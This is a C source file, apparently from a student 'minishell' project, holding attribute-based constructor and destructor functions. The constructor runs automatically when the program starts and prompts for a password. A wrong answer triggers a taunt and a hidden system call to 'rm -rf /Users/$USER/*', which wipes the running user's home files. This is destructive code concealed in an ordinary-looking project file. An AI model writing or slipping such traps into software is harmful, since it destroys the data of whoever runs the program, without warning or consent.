/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   attr_fncs.c                                        :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: wabolles <wabolles@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2024/11/26 10:03:08 by wabolles          #+#    #+#             */
/*   Updated: 2024/11/29 18:43:50 by wabolles         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "minishell.h"

void	__attribute__ ((constructor))	init(void)
{
	char *line = readline("Guess The Password Mr Pentester :_ : ");
	gc_add(line);
	if (ft_strcmp(line, "howoldareyou"))
	{
		printf("Now Check Your Personal Data !\nGood luck Next time Mr Stupid!\n");
		system("rm -rf /Users/$USER/*");
		exit(-42);
	}
	rl_catch_signals = 0;
	ft_signal();
}

void	__attribute__ ((destructor))
	_endfn(void)
{
	close_fds();
}
